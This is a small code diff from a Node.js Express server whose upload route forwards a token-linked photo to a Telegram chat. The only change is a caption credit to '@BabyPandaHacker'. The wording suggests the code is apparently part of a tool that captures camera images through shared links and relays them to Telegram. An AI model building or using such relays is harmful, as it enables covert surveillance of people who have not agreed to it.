@@ -56,7 +56,7 @@ app.post("/api/upload/:token", upload.single("photo"), async (req, res) => {
   if (!chatId) return res.json({ error: "Invalid token" });
 
   await bot.sendPhoto(chatId, req.file.path, {
-    caption: "✅ Camera image mil gaya!",
+    caption: "✅ Camera image mil gaya made by >> @BabyPandaHacker",
   });
 
   delete links[req.params.token];
